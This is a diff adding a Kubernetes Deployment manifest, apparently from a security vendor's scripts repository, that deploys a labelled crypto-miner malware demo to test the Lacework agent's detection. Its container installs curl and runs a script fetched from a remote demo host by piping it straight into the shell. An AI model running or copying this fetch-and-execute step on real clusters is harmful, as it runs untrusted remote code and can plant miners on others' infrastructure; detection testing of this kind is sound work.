@@ -1,0 +1,26 @@
+# Deploys a crypto miner malware example for testing the Lacework agent
+# Run the following command to deploy the example
+# kubectl apply -f https://raw.githubusercontent.com/lacework-dev/scripts/main/k8s-crypto-miner.yaml
+# Run the following command to delete the example
+# kubectl delete -f https://raw.githubusercontent.com/lacework-dev/scripts/main/k8s-crypto-miner.yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  labels:
+    app: crypto-miner
+  name: crypto-miner
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: crypto-miner
+  template:
+    metadata:
+      labels:
+        app: crypto-miner
+    spec:
+      containers:
+      - image: ubuntu:latest
+        name: crypto-miner
+        command: ["/bin/bash"]
+        args: ['-c', 'apt-get update ; apt-get install -y curl ; source <(curl -s http://lwmalwaredemo.com/install-demo-1.sh)' ]
